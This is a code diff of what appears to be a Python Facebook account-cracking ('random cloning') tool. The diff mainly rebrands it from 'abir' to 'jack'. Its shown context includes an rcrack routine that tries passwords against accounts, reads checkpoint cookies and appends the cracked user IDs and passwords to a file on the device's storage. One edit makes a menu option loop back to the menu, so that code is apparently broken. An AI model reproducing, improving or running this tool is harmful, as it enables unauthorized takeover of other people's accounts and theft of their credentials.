@@ -235,7 +235,7 @@ def FD():
 
         os.system('xdg-open https://m.youtube.com/@DarkFixNet67Team')
 
-        abir()
+        jack()
 
         return None
 
@@ -247,7 +247,7 @@ def jack():
 
     jalan(logo)
     
-    os.system('espeak -a 300 "ASSALAAAMUUU  AALAIKUMM । আমার  নাম   জ্যেক।    আমার  টুল  ব্যবহার  করার  জন্য  স্বাগতম"')
+    os.system('espeak -a 300 "ASSALAAAMUUU  AALAIKUMM । আমার  নাম   জ্যেক।    আমার  । টুলস  । ব্যবহার  করার  জন্য  স্বাগতম"')
     
 
     print("")
@@ -271,13 +271,13 @@ def jack():
     if opt == '1':
         os.system('espeak -a 300 "random cloning start"')
         time.sleep(0.5)
-        i()
+        jack()
 
         return None
 
     if opt == '3':
 
-        abir_sanjida()
+        jack_sanjida()
 
         return None
 
@@ -289,7 +289,7 @@ def jack():
 
     if opt == '2':
 
-        abir()
+        jack()
 
     if opt == '0':
 
@@ -606,7 +606,7 @@ def i():
     print(logo)
    
 
-    passx = int(input("[*] Type👉 y/0  and Enter : "))
+    passx = int(input("[*] Type👉 0 👈and Enter : "))
 
     HamiiID = []
 
@@ -663,7 +663,7 @@ def i():
     print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 #x = open('/sdcard/1ua.txt','r').read().splitlines()
-def abir_sanjida():
+def jack_sanjida():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -757,8 +757,8 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\033[0;93m[ABIR-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/ABIR-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print('\r\r\033[0;93m[jack-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/jack-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:	
